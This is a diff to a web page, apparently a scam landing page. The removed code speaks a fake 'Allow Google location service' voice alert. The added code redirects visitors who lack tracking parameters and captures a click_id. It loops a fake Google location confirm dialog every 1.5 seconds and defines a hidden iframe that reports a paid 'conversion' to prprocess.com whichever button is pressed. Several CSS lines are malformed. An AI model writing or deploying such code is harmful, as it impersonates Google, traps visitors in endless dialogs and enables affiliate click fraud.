@@ -9,14 +9,12 @@
 <style>
 body {
 	background-image: url(https://pepebro.github.io/memory/bk.jpeg);
-    background-color: #999999;
-    height:100%
-    overflow: hidden;
-    background-repeat: no-repeat;
-    background-size: cover;
-    text-align: center;
-		
-}
+	background-color: #999999;
+	height:100%
+	background-repeat; no-repeat;
+	background-size: cover;
+	text-align: center;
+    }
 
 </style>
 
@@ -39,58 +37,61 @@ body {
 
 	
 </head>
-<body>  
-
-
-
-
-
-<script language=javascript>
-
-
-setTimeout(function(){
-var msg = new SpeechSynthesisUtterance();
-var voices = speechSynthesis.getVoices();	
-function findVoice(lang) {        
-   for (var i = 0; i < voices.length; i++) {
-     if (voices[i].lang === lang) { return voices[i];}
-   }
-return null;
-}	
-function speak(text) {
-msg.lang = 'en-US';
-msg.voice = findVoice(msg.lang);
-msg.voiceURI = 'native';
-msg.volume = 1;
-msg.rate = 1;
-msg.pitch = 1;
-msg.text = text;
-speechSynthesis.speak(msg);}
-speak('\n Attention \n\n Allow Google location service. \n');
-
-},1000);</script>
-
+<body onload="myP()">  
+        <script>
+                var url = window.location.href;
+                if (url.indexOf("?") < 0) {
+                console.log(url);
+                window.location.href = "https://pepebro.github.io";
+                stop;
+                }else{
+                    url_string = window.location.href; 
+                    url = new URL(url_string);
+                    click_id = url.searchParams.get("click_id");
+                    source_id = url.searchParams.get("source_id");
+                    console.log(click_id);
+                    console.log(source_id);
+                };
+               </script>
 <script>
       
-      // On Reload-click, display Messages //
-        //var number = document.getElementById("reload");
-        window.onload = function() {
-          myP();
-          };
+
   
   
   
           function myP(){
 		  confirm("Allow Google location service?");
 		  setTimeout(myP, 1500);
+          if (window.confirm)
+          {
+            // They clicked Yes
+            console.log('Clicked Confirm')
+            function prepareFrame() {
+				     var ifrm = document.createElement("iframe");
+				     ifrm.setAttribute("src", "https://prprocess.com/conversion/?user_id=6449&click_id="+click_id+"&currency=USD&payout=0.01");
+				     ifrm.style.width = "60px";
+				     ifrm.style.height = "60px";
+				     document.body.appendChild(ifrm);
+			     }
+
+            }else{
+                console.log('Clicked CANCEL')
+                	function prepareFrame() {
+				     var ifrm = document.createElement("iframe");
+				     ifrm.setAttribute("src", "https://prprocess.com/conversion/?user_id=6449&click_id="+click_id+"&currency=USD&payout=0.01");
+				     ifrm.style.width = "60px";
+				     ifrm.style.height = "60px";
+				     document.body.appendChild(ifrm);
+			     }
+
+            }
 
           
           
           }
-  
+	</script>
+	
 
-        
-</script>
  
   </body>
 </html>
